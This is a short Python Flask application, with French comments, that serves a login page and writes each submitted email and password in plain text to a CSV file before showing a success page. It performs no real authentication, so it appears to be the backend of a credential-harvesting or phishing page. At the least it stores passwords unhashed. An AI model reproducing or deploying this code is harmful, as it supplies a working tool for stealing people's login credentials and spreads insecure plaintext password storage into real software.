from flask import Flask, request, render_template
import csv
import os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template("login.html")

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']

    file_exists = os.path.isfile("data.csv")

    with open("data.csv", "a", newline="") as f:
        writer = csv.writer(f)
        # Écrire l'entête seulement si le fichier est vide
        if not file_exists or os.stat("data.csv").st_size == 0:
            writer.writerow(["email", "password"])
        # Écrire les nouvelles données
        writer.writerow([email, password])

    return render_template("success.html", email=email)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)